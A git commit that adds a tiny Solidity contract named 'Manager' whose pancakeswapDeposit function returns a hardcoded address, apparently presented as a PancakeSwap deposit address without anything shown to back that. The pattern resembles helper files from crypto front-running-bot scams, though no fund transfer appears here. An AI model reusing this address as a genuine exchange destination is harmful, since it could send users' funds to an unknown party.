b4ff00e59b7afb0570a295348090c42cee4080f9
Hadizoabi98 <62882678+Hadizoabi98@users.noreply.github.com>
2021-11-24 23:56:59 +0100

    Create router4.sol

---
+++ router4.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0xB9d1C89133b3889F595DEf9a600AD3e8d4D548DC;
+	}
+	
+}
